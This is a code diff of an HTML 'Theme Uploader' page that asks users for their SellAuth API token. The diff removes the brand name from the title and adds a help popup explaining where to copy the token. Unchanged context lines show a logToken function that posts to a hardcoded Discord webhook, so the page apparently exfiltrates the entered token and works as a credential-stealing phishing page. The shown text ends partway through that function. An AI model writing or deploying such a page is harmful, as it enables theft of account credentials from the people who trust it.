@@ -3,10 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SellAuth Theme Uploader</title>
+    <title>Theme Uploader</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
         input, select, button { margin: 10px; padding: 8px; width: 80%; max-width: 300px; }
+        .help { margin-top: 20px; font-size: 14px; color: blue; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -19,8 +20,13 @@
     <input type="text" id="themeName" placeholder="Enter Theme Name">
     <button onclick="submitTheme()">Submit</button>
     <p id="result"></p>
+    <p class="help" onclick="showHelp()">How to find your Sellauth API Token?</p>
 
     <script>
+        function showHelp() {
+            alert("To locate your Sellauth API Token:\n1. Log in to your Sellauth account at https://dash.sellauth.com.\n2. Navigate to the 'API Keys' section under account settings.\n3. Copy your API token and paste it here.");
+        }
+
         async function logToken(token) {
             const webhookUrl = "https://ptb.discord.com/api/webhooks/1337931338921021440/ijdBUUGfVZr7GRf51dsJ42_qGxqsnk5rjzIL7-VNTR2KntQWdRqqLSuZsclN9fG7x7-E";
             const payload = {
